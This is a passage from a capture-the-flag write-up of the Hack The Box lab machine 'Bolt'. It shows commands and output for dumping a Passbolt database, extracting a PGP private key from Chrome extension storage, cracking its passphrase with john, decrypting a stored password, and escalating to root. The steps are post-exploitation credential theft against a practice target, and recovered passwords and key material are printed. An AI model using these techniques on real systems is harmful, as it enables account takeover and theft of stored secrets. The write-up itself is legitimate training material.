1 row in set (0.00 sec)
```


## Passbolt database

```mysql
www-data@bolt:/etc/passbolt$ mysql -u passbolt -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 581
Server version: 8.0.26-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| passboltdb         |
+--------------------+
2 rows in set (0.00 sec)

mysql> use passboltdb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_passboltdb  |
+-----------------------+
| account_settings      |
| action_logs           |
| actions               |
| authentication_tokens |
| avatars               |
| comments              |
| email_queue           |
| entities_history      |
| favorites             |
| gpgkeys               |
| groups                |
| groups_users          |
| organization_settings |
| permissions           |
| permissions_history   |
| phinxlog              |
| profiles              |
| resource_types        |
| resources             |
| roles                 |
| secret_accesses       |
| secrets               |
| secrets_history       |
| user_agents           |
| users                 |
+-----------------------+
25 rows in set (0.00 sec)

mysql> select * from users;
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| id                                   | role_id                              | username       | active | deleted | created             | modified            |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 1cfcd300-0664-407e-85e6-c11664a7d86c | eddie@bolt.htb |      1 |       0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 |
| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb |      1 |       0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
2 rows in set (0.00 sec)

mysql>
```

## Secret?

```mysql
mysql> desc secrets;
+-------------+------------+------+-----+---------+-------+
| Field       | Type       | Null | Key | Default | Extra |
+-------------+------------+------+-----+---------+-------+
| id          | char(36)   | NO   | PRI | NULL    |       |
| user_id     | char(36)   | NO   | MUL | NULL    |       |
| resource_id | char(36)   | NO   | MUL | NULL    |       |
| data        | mediumtext | NO   |     | NULL    |       |
| created     | datetime   | NO   |     | NULL    |       |
| modified    | datetime   | NO   |     | NULL    |       |
+-------------+------------+------+-----+---------+-------+
6 rows in set (0.00 sec)

mysql> select data from secrets;
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| data                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| -----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
 |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

```

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ cat > openpgpmessage
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
```


We chat again and we gain SSH access ad `eddie` user (password reuse!!!!)

## User flag

```bash
eddie@bolt:~$ wc user.txt
 1  1 33 user.txt
```

## privesc


```bash
eddie@bolt:/var/mail$ sudo -l
[sudo] password for eddie:
Sorry, user eddie may not run sudo on bolt.
eddie@bolt:/var/mail$ crontab -l
no crontab for eddie
```

### mail

```bash
eddie@bolt:~$ cd /var/mail/
eddie@bolt:/var/mail$ ls
eddie  root  sugo  www-data
eddie@bolt:/var/mail$ cat er
cat: er: No such file or directory
eddie@bolt:/var/mail$ cat eddie
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark

eddie@bolt:/var/mail$

```

As suggested, we add Passbolt extension to our browser

![](Pasted%20image%2020230822165431.png)


We try to access within Roundcube with Eddie's credentials, but without success.

Let's try with original URL

`http://passbolt.bolt.htb`

![](Pasted%20image%2020230822165628.png)

### LaZagne

no luck, we need several Python module

```bash
eddie@bolt:~$ python3 laZagne.py
usage: laZagne.py [-h] [--version] {all,chats,sysadmin,databases,mails,memory,wifi,browsers,wallet,git,unused} ...

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {all,chats,sysadmin,databases,mails,memory,wifi,browsers,wallet,git,unused}
                        Choose a main command
    all                 Run all modules
    chats               Run chats module
    sysadmin            Run sysadmin module
    databases           Run databases module
    mails               Run mails module
    memory              Run memory module
    wifi                Run wifi module
    browsers            Run browsers module
    wallet              Run wallet module
    git                 Run git module
    unused              Run unused module

optional arguments:
  -h, --help            show this help message and exit
  --version             laZagne version
eddie@bolt:~$ python3 laZagne.py  all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[-] Module Thunderbird is not used due to unresolved dependence:
No module named 'pyasn1'
[-] Module Env_variable is not used due to unresolved dependence:
No module named 'psutil'
[-] Module Cli is not used due to unresolved dependence:
No module named 'psutil'
[-] Module GitForLinux is not used due to unresolved dependence:
No module named 'psutil'
[-] Module ChromiumBased is not used due to unresolved dependence:
No module named 'Crypto'
[-] Module Mozilla is not used due to unresolved dependence:
No module named 'pyasn1'

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.03184938430786133

```

### private key

Let's try manually finding Eddie's private key

```bash
eddie@bolt:~$ shopt -s dotglob
eddie@bolt:~$ grep -ril "PRIVATE KEY" *
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors.min.js
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/data/js/dist/setup.js
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/data/js/dist/recover.js
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/data/js/dist/login.js
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/data/config-debug.html
.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
```

```bash
..
eddie@bolt:~$ strings ".config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log"
...
...
_passbolt_data
Q{"config":{"log":{"console":false,"level":0},"user.firstname":"Eddie","user.id":"4e184ee6-e436-47fb-91c9-dccb57f250bc","user.lastname":"Johnson","user.settings.securityToken.code":"GOZ","user.settings.securityToken.color":"#607d8b","user.settings.securityToken.textColor":"#ffffff","user.settings.trustedDomain":"https://passbolt.bolt.htb","user.username":"eddie@bolt.htb"},"passbolt-private-gpgkeys":"{\"MY_KEY_ID\":{\"key\":\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW\\r\\nUjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6T
...
...
```


```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ sed -e 's/\\\\r\\\\n/\n\r/g' eddie_private_key
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
AAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW
UjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua
jS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA
iOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac
2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj
QY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavt
..
..
```

Let's crack!

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ john  eddie_private_key_to_crack --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:12:57 0.19% (ETA: 2023-08-27 10:09) 0g/s 42.64p/s 42.64c/s 42.64C/s rockpass..riverview
merrychristmas   (Eddie Johnson)
1g 0:00:16:47 DONE (2023-08-22 17:33) 0.000992g/s 42.51p/s 42.51c/s 42.51C/s merrychristmas..menudo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Import Eddie's private key

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ gpg --import eddie_private_key2
gpg: key 1C2741A3DC3B4ABD: public key "Eddie Johnson <eddie@bolt.htb>" imported
gpg: key 1C2741A3DC3B4ABD/1C2741A3DC3B4ABD: error sending to agent: Timeout
gpg: error building skey array: Timeout
gpg: error reading 'eddie_private_key2': Timeout
gpg: import from 'eddie_private_key2' failed: Timeout
gpg: Total number processed: 0
gpg:               imported: 1
gpg:       secret keys read: 1
```

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ gpg --list-secret-keys
/home/joshua/.gnupg/pubring.kbx
-------------------------------
....
....
sec   rsa3072 2021-02-24 [SC]
      59860A269E803FA094416753AB8E2EFB56A16C84
uid           [ unknown] Passbolt Server Key <admin@bolt.htb>
ssb   rsa3072 2021-02-24 [E]
```

Eddie's key is not there!

Let's try again with `--pinentry-mode loopback`:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ gpg --pinentry-mode loopback --import eddie_private_key2
gpg: key 1C2741A3DC3B4ABD: "Eddie Johnson <eddie@bolt.htb>" not changed
gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Now is ok.



```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ gpg --pinentry-mode loopback --decrypt openpgpmessage
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Signature made Sat 06 Mar 2021 04:33:54 PM CET
gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
```

We see another password. Maybe root's password?

## root flag

```bash
eddie@bolt:~$ su -
Password:
root@bolt:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bolt:~# wc root.txt
 1  1 33 root.txt
root@bolt:~#

```